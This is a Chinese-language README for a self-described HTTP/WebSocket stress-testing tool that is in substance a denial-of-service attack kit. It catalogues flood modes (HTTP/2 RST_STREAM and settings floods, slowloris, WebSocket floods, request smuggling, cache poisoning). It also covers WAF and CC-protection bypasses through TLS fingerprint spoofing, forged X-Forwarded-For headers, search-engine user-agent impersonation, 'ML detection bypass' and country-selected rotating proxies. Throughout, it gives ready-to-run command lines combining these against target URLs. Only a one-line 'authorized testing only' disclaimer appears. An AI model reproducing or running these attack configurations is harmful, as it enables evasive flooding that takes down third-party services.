# HTTP/WebSocket 压力测试工具

一个功能强大的 HTTP/WebSocket 压力测试工具,支持多种攻击模式和绕过技术。

## 目录
- [1. 概述](#1-概述)
- [2. 核心功能](#2-核心功能)
- [3. 技术规格](#3-技术规格)
- [4. 详细功能说明](#4-详细功能说明)
- [5. 配置说明](#5-配置说明)
- [6. 攻击模式组合](#6-攻击模式组合)
- [7. 安全与合规](#7-安全与合规)
- [8. 监控与运维](#8-监控与运维)
- [9. 错误处理](#9-错误处理)
- [10. 使用示例](#10-使用示例)

## 1. 概述

### 1.1 工具定位
- 支持 HTTP/1.1、HTTP/2 和 WebSocket 协议的压力测试
- 提供多种攻击模式和绕过技术的组合使用
- 支持分布式压测和实时监控
- 提供友好的命令行界面和实时状态显示

### 1.2 主要特性
- 多协议支持：HTTP/1.1、HTTP/2、WebSocket
- 丰富的攻击模式
- 智能绕过 WAF/CC 防护
- 分布式压测能力
- 实时监控和统计
- 随机函数支持
- 美观的实时UI界面

## 2. 核心功能

### 2.1 基础功能
- HTTP/HTTPS 请求发送
- WebSocket 连接管理
- 代理支持和管理
- 资源使用控制
- 实时监控和统计

### 2.2 攻击模式
#### 2.2.1 HTTP 基础攻击
- GET/POST 洪水
- HEAD/OPTIONS/TRACE 洪水
- 慢速攻击（Slowloris/Slow POST）
- 缓存击穿
- HTTP Range 攻击
- Gzip 压缩放大
- 分块传输攻击
- Expect:100-continue 攻击
- 大文件上传攻击
- 混合方法攻击
- Body 洪水攻击

#### 2.2.2 HTTP/2 攻击
- HTTP/2 帧洪水
- 优先级攻击
- RST_STREAM 攻击
- GOAWAY 攻击
- SETTINGS 帧攻击
- HEADERS 帧攻击
- 窗口更新帧攻击
- PING帧洪水
- 服务器推送攻击
- 流依赖攻击
- 头部表攻击

#### 2.2.3 WebSocket 攻击
- 消息洪水
- 分片攻击
- 压缩放大
- PING 洪水
- 帧掩码攻击
- 连接洪水
- 协议滥用
- 扩展滥用

#### 2.2.4 协议混淆攻击
- 协议混淆
- 协议升级滥用
- WebSocket 隧道
- HTTP 隧道
- 混合协议攻击

#### 2.2.5 应用层攻击
- 慢速连接攻击
- 慢速读取攻击
- 慢速POST攻击
- R-U-Dead-Yet攻击
- TCP重组攻击
- HTTP请求走私
- HTTP请求分割
- 协议降级攻击
- 缓存投毒
- DNS重绑定
- 参数污染

#### 2.2.6 智能攻击模式
- 智能洪水（自动选择最佳攻击方式）
- 资源耗尽攻击
- 连接滥用攻击
- 自适应攻击模式

### 2.3 绕过技术
#### 2.3.1 基础绕过
- TLS 指纹伪造
- 行为模拟
- 协议混淆
- 多重绕过组合

#### 2.3.2 请求绕过
- 请求头绕过
- 请求方法绕过
- 路径绕过
- 编码绕过
- 压缩绕过
- 字符集绕过
- 分片绕过

#### 2.3.3 TLS/SSL绕过
- 加密套件绕过
- 版本绕过
- 证书绕过
- SNI绕过
- ALPN绕过

#### 2.3.4 智能绕过
- 自动检测防护
- 自适应绕过
- 学习模式绕过
- 模式识别绕过

#### 2.3.5 防护探测绕过
- 速率模式识别绕过
- 行为模式识别绕过
- 特征绕过
- 机器学习检测绕过

## 3. 技术规格

### 3.1 性能指标
- 单机最大并发连接数：5000
- CPU 使用率上限：70%
- 内存使用上限：系统总量的 50%
- 最小请求间隔：1ms
- 代理切换阈值：5次失败

### 3.2 资源限制
```bash
# CPU 限制
-cpu <percentage>         # CPU使用率限制，范围：1-100，默认：70

# 内存限制
-memory <percentage>      # 内存使用率限制，范围：1-100，默认：50

# 并发限制
-max-conns <number>       # 最大并发连接数，默认：5000
-max-conns-per-host <number> # 每个主机最大连接数，默认：100

# 系统限制
-max-files <number>       # 最大打开文件数，默认：100000
-gomaxprocs <number>      # Go最大处理器数，默认：CPU核心数
```

### 3.3 协议支持
- HTTP/1.0
- HTTP/1.1
- HTTP/2
- WebSocket (v13)
- TLS 1.2/1.3

## 4. 详细功能说明

### 4.1 攻击参数规范
```bash
# 通用参数
-url <string>            # 目标URL，必需
-c <number>              # 并发数，默认：10
-t <number>              # 持续时间(秒)，默认：60
-i <number>              # 请求间隔(毫秒)，默认：1

# 代理参数
-proxy-type <string>     # 代理类型，可选值：
                         # - local          # 本地代理文件模式，默认加载config/proxies.txt文件，不支持countries指定；
                         # - api            # API代理模式
                         # - none           # 不使用代理（默认）
-proxy-file <string>     # 本地代理文件路径，默认：config/proxies.txt，用于加载本地代理文件模式使用，可以不需要携带参数，直接传递文件；
-proxy-api-pool <string> # API代理池名称，默认：pool1
-proxy-countries <string> # 指定代理IP的国家/地区，用逗号分隔
                         # 示例：CN,TW,JP,US,KR
                         # 支持的国家代码见下方说明
-proxy-failover         # 启用代理故障转移，默认：false
-proxy-timeout <number>  # 代理超时时间(秒)，默认：10
-proxy-retry <number>    # 代理重试次数，默认：3
-proxy-validate         # 启用代理验证，默认：false
-proxy-validate-url <string> # 代理验证URL，默认：http://www.google.com
-proxy-rotate-interval <number> # 代理轮换间隔(毫秒)，默认：100毫秒

# User-Agent参数
-ua-type <string>        # User-Agent类型，可选值：
                         # - cn_mobile      # 中国手机UA
                         # - cn_app         # 中国手机APP UA
                         # - global_mobile  # 全球主流手机UA
                         # - pc             # PC浏览器UA
                         # - search_engine  # 搜索引擎UA
                         # - random         # 随机选择UA
                         # - custom         # 自定义UA文件

# 攻击模式
-attack <string>         # 攻击类型，可选值：
                         # 基础HTTP攻击：
                         # - get-flood
                         # - post-flood
                         # - head-flood
                         # - options-flood
                         # - trace-flood
                         # - mixed-method
                         # - body-flood
                         # - chunk-flood
                         # - expect-flood
                         # - range-flood
                         # - multipart-flood
                         # - slowloris
                         # - slowpost
                         
                         # HTTP/2攻击：
                         # - http2flood
                         # - http2priority
                         # - http2rst
                         # - http2goaway
                         # - h2-window-update
                         # - h2-ping-flood
                         # - h2-push-promise
                         # - h2-stream-dep
                         # - h2-settings-flood
                         # - h2-header-table
                         
                         # WebSocket攻击：
                         # - ws-flood
                         # - ws-fragment
                         # - ws-compress-amp
                         # - ws-ping-flood
                         # - ws-frame-masking
                         # - ws-connection-flood
                         # - ws-protocol-abuse
                         # - ws-extension-abuse
                         
                         # 协议混淆攻击：
                         # - protocol-confusion
                         # - upgrade-abuse
                         # - websocket-tunnel
                         # - http-tunnel
                         
                         # 智能攻击：
                         # - smart-flood
                         # - mixed-protocol
                         # - resource-exhaust
                         # - connection-abuse
                         
                         # 特殊攻击：
                         # - cache-poison
                         # - dns-rebinding
                         # - request-smuggling
                         # - parameter-pollution

# 绕过参数
-bypass <string>         # 绕过模式，可用逗号分隔多个值：
                         # 基础绕过：
                         # - tls
                         # - behavior
                         # - protocol
                         # - rate-limit
                         # - cookie-bypass
                         
                         # 请求绕过：
                         # - header-bypass
                         # - method-bypass
                         # - path-bypass
                         # - encoding-bypass
                         # - compression-bypass
                         # - charset-bypass
                         # - fragment-bypass
                         # - timing-bypass
                         
                         # TLS绕过：
                         # - cipher-suite
                         # - version-bypass
                         # - cert-bypass
                         # - sni-bypass
                         # - alpn-bypass
                         
                         # 智能绕过：
                         # - auto-detect
                         # - adaptive-bypass
                         # - learning-bypass
                         # - pattern-bypass
                         
                         # 防护探测绕过：
                         # - rate-pattern
                         # - behavior-pattern
                         # - signature-bypass
                         # - ml-bypass
```

### 4.2 随机函数规范
```bash
# 基础随机函数
%RANDINT%                # 随机整数 (0-999999)
%RANDINT:min-max%        # 指定范围随机整数
%RANDSTR%                # 随机字符串 (8位)
%RANDSTR:charset:length% # 指定字符集和长度的随机字符串

# 特殊随机函数
%RANDPATH(options)%      # 随机路径选择器
%TIME%                   # 秒级时间戳
%TIME:ms%               # 毫秒级时间戳
%XFF%                   # 随机X-Forwarded-For
%UA%                    # 随机User-Agent

# 高级随机函数
%RANDUSER%              # 随机用户名
%RANDEMAIL%             # 随机邮箱
%RANDPHONE%             # 随机手机号
%RANDIPV4%              # 随机IPv4地址
%RANDIPV6%              # 随机IPv6地址
%UUID%                  # 随机UUID
```

### 4.3 User-Agent 类型说明

#### 4.3.1 中国手机UA (cn_mobile)
```text
# 示例
Mozilla/5.0 (Linux; Android 11; Redmi K30 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 10; HUAWEI P40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 10; OPPO Find X2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; vivo X60 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36
```

#### 4.3.2 中国手机APP UA (cn_app)
```text
# 示例
Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.3(0x18000323) NetType/WIFI Language/zh_CN
Mozilla/5.0 (Linux; Android 10; Redmi K30 5G Build/QKQ1.191222.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.72 Mobile Safari/537.36 Weibo (Xiaomi-Redmi K30 5G__weibo__11.3.0__android__android10)
Mozilla/5.0 (Linux; Android 11; M2102J2SC Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.72 Mobile Safari/537.36 Alipay/10.2.0.8000
okhttp/4.9.0 DYZB/6.9.0 (iPhone; iOS 14.4; Scale/3.00)
```

#### 4.3.3 全球主流手机UA (global_mobile)
```text
# 示例
Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36
Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1
```

#### 4.3.4 PC浏览器UA (pc)
```text
# 示例
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/89.0.774.45
```

#### 4.3.5 搜索引擎UA (search_engine)
```text
# 中国搜索引擎
Baiduspider/2.0; +http://www.baidu.com/search/spider.html
Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
360Spider(http://webscan.360.cn)

# 国际搜索引擎
Googlebot/2.1 (+http://www.google.com/bot.html)
Bingbot/2.0; +http://www.bing.com/bingbot.htm
DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)
```

#### 4.3.6 使用示例
  ```bash
# 使用中国手机UA
./http-tool -url "https://example.com" -ua-type cn_mobile

# 使用中国APP UA并随机切换
./http-tool -url "https://example.com" -ua-type cn_app -ua-random

# 使用自定义UA文件
./http-tool -url "https://example.com" -ua-type custom -ua-file "./config/custom-ua.txt"

# 组合使用示例
./http-tool -url "https://example.com" \
  -attack http2flood \
  -ua-type global_mobile \
  -ua-random \
  -bypass "tls,behavior" \
  -c 1000
```

### 4.4 代理配置说明

#### 4.4.1 本地代理文件格式 (config/proxies.txt)
```text
# 支持的代理格式：
# - http://<ip>:<port>
# - https://<ip>:<port>
# - socks5://<ip>:<port>
# - socks5://<username>:<password>@<ip>:<port>

# 示例
http://127.0.0.1:8080
https://proxy.example.com:8443
socks5://192.168.1.1:1080
socks5://user:pass@proxy.example.com:1080

# 每行一个代理，支持注释
# 自动忽略空行和格式错误的行
```

#### 4.4.2 API代理配置格式 (config/api.json)
```json
{
    "pool1": {
        "urls": [
            "https://api1.example.com/proxies",
            "https://api2.example.com/proxies"
        ],
        "method": "GET",
        "headers": {
            "Authorization": "Bearer xxx",
            "Content-Type": "application/json"
        },
        "params": {
            "countries": "%COUNTRIES%",  # 将被实际国家代码替换
            "type": "http",
            "anonymity": "high"
        },
        "interval": 300,
        "timeout": 10,
        "country_param_name": "countries",  # API国家参数名称
        "response_format": {
            "proxy_field": "data.proxies",  # 代理数据在响应中的位置
            "ip_field": "ip",              # IP字段名
            "port_field": "port",          # 端口字段名
            "country_field": "country",    # 国家字段名
            "type_field": "type"          # 代理类型字段名
        }
    },
    "pool2": {
        "urls": ["https://api3.example.com/proxies"],
        "method": "POST",
        "data": {
            "countries": ["%COUNTRIES%"],
            "type": "all",
            "limit": 100
        },
        "headers": {
            "API-Key": "your-api-key"
        },
        "country_param_name": "countries",
        "response_format": {
            "proxy_field": "result",
            "ip_field": "proxy_ip",
            "port_field": "proxy_port",
            "country_field": "country_code",
            "type_field": "proxy_type"
        }
    }
}
```

#### 4.4.3 支持的国家/地区代码
```text
# 亚洲
CN  - 中国大陆
HK  - 中国香港
TW  - 中国台湾
JP  - 日本
KR  - 韩国
SG  - 新加坡
IN  - 印度
ID  - 印度尼西亚
VN  - 越南
MY  - 马来西亚

# 北美洲
US  - 美国
CA  - 加拿大
MX  - 墨西哥

# 欧洲
GB  - 英国
DE  - 德国
FR  - 法国
IT  - 意大利
ES  - 西班牙
NL  - 荷兰
RU  - 俄罗斯

# 大洋洲
AU  - 澳大利亚
NZ  - 新西兰

# 南美洲
BR  - 巴西
AR  - 阿根廷

# 非洲
ZA  - 南非
EG  - 埃及
```

#### 4.4.4 代理使用示例
```bash
# 使用API代理池并指定国家
./http-tool -url "https://example.com" \
  -proxy-type api \
  -proxy-api-pool pool1 \
  -proxy-countries "CN,HK,TW,JP" \
  -proxy-rotate-interval 30

# 使用API代理池指定多个地区
./http-tool -url "https://example.com" \
  -proxy-type api \
  -proxy-api-pool pool2 \
  -proxy-countries "US,GB,DE,FR" \
  -proxy-failover

# 混合攻击模式下使用特定国家代理
./http-tool -url "https://example.com" \
  -attack "http2flood,slowloris" \
  -proxy-type api \
  -proxy-api-pool pool1 \
  -proxy-countries "JP,KR,SG" \
  -proxy-failover \
  -c 1000 \
  -bypass "tls,behavior"

# 高级代理配置与国家选择
./http-tool -url "https://example.com" \
  -proxy-type api \
  -proxy-api-pool pool1 \
  -proxy-countries "CN,US,GB" \
  -proxy-failover \
  -proxy-timeout 5 \
  -proxy-retry 3 \
  -proxy-rotate-interval 60 \
  -proxy-validate
```

## 5. 配置说明

### 5.1 文件路径规范
```
/
├── config/                # 配置文件目录
│   ├── proxies.txt       # 代理配置文件
│   ├── api.json          # API配置文件
│   └── user-agents.txt   # UA配置文件
├── logs/                 # 日志目录
│   ├── attack.log       # 攻击日志
│   ├── error.log        # 错误日志
│   └── metrics.log      # 指标日志
└── data/                 # 数据目录
    └── temp/            # 临时文件目录
```

### 5.2 配置文件格式
```json
// config/api.json
{
    "pool1": [
        "https://api1.example.com",
        "https://api2.example.com"
    ],
    "pool2": [
        "https://api3.example.com",
        "https://api4.example.com"
    ]
}
```

### 5.3 特性：

- 支持五个日志级别：DEBUG、INFO、WARN、ERROR、FATAL
- 可配置是否显示调用者信息（文件名和行号）
- 可配置是否显示彩色输出（仅在终端中有效）
- 可自定义时间格式
- 日志级别过滤（低于设置级别的日志不会输出）
- 支持从字符串解析日志级别
- 线程安全

## 6. 攻击模式组合

### 6.1 基础组合攻击
```bash
# HTTP/2 + TLS绕过 + 代理
./http-tool -url "https://example.com" \
  -attack http2flood \
  -bypass "tls,protocol" \
  -fp chrome \
  -proxy-type local \
  -c 1000

# 慢速攻击 + 行为模拟
./http-tool -url "https://example.com" \
  -attack slowloris \
  -bypass "behavior" \
  -delay "100-500" \
  -headers "Cookie:%RANDSTR%" \
  -c 500
```

### 6.2 高级组合攻击
```bash
# 多层防护绕过
./http-tool -url "https://example.com" \
  -attack "http2flood,slowpost" \
  -bypass "tls,behavior,protocol" \
  -fp firefox \
  -delay "50-200" \
  -headers "X-Forwarded-For:%XFF%;User-Agent:%UA%" \
  -proxy-type api \
  -proxy-pool pool1 \
  -proxy-failover

# 缓存层击穿 + 协议降级
./http-tool -url "https://example.com/%RANDSTR%" \
  -attack "cache-bust,protocol-downgrade" \
  -method "PURGE,GET" \
  -headers "Cache-Control:no-cache" \
  -c 2000 \
  -i 0
```

### 6.3 特殊场景组合
```bash
# CDN绕过 + WAF绕过
./http-tool -url "https://example.com" \
  -attack "http2priority" \
  -bypass "tls,rate-limit" \
  -headers "X-Forwarded-For:%RANDIPV4%;User-Agent:%UA%" \
  -cookies "session=%RANDSTR%" \
  -proxy-type local \
  -proxy-failover \
  -c 1000 \
  -t 3600

# WebSocket + HTTP/2 混合攻击
./http-tool -url "wss://example.com/ws" \
  -attack "ws-flood,http2flood" \
  -ws-message "%RANDSTR%" \
  -http2-settings "SETTINGS_MAX_CONCURRENT_STREAMS=100" \
  -c 500 \
  -pr 2
```

### 6.4 智能攻击组合
```bash
# 自适应攻击模式
./http-tool -url "https://example.com" \
  -attack "smart-flood" \
  -bypass "auto-detect,adaptive-bypass" \
  -c 1000 \
  -t 3600

# 全方位防护绕过
./http-tool -url "https://example.com" \
  -attack "mixed-protocol" \
  -bypass "learning-bypass,pattern-bypass" \
  -headers "X-Forwarded-For:%XFF%" \
  -ua-type random \
  -proxy-type api \
  -proxy-failover

# 资源耗尽攻击
./http-tool -url "https://example.com" \
  -attack "resource-exhaust,connection-abuse" \
  -bypass "timing-bypass,fragment-bypass" \
  -c 2000 \
  -max-conns-per-host 200

# 高级特征绕过
./http-tool -url "https://example.com" \
  -attack "protocol-confusion,request-smuggling" \
  -bypass "ml-bypass,signature-bypass" \
  -fp random \
  -headers "X-Custom-%RANDSTR%: %RANDSTR%"
```

## 7. 安全与合规

### 7.1 访问控制
- API密钥认证
- IP白名单
- 操作审计日志

### 7.2 使用限制
- 仅用于授权测试
- 遵守相关法律法规
- 保护目标系统安全

## 8. 监控与运维

### 8.1 监控指标
- 请求成功率
- 响应时间分布
- 错误类型统计
- 资源使用情况
- 代理健康状态

### 8.2 告警阈值
- CPU使用率 > 90%
- 内存使用率 > 80%
- 错误率 > 30%
- 响应延迟 > 5s

## 9. 错误处理

### 9.1 错误类型
- 网络连接错误
- 代理失效
- 资源超限
- 协议错误

### 9.2 恢复策略
- 自动重试（最大3次）
- 代理故障转移
- 动态调整并发
- 降级处理

## 10. 使用示例

### 10.1 基础测试
```bash
# 简单GET测试
./http-tool -url "http://example.com" -c 100 -t 60

# POST数据测试
./http-tool -url "http://example.com" \
  -attack post \
  -data "key=value" \
  -c 50
```

### 10.2 高级测试
```bash
# 完整压力测试
./http-tool -url "https://example.com" \
  -attack "http2flood,slowloris" \
  -bypass "tls,behavior" \
  -fp chrome \
  -proxy-type api \
  -proxy-pool pool1 \
  -c 1000 \
  -t 3600 \
  -i 100 \
  -headers "X-Forwarded-For:%XFF%" \
  -cookies "session=%RANDSTR%" \
  -max-conns-per-host 100 \
  -cpu 70 \
  -memory 50
```
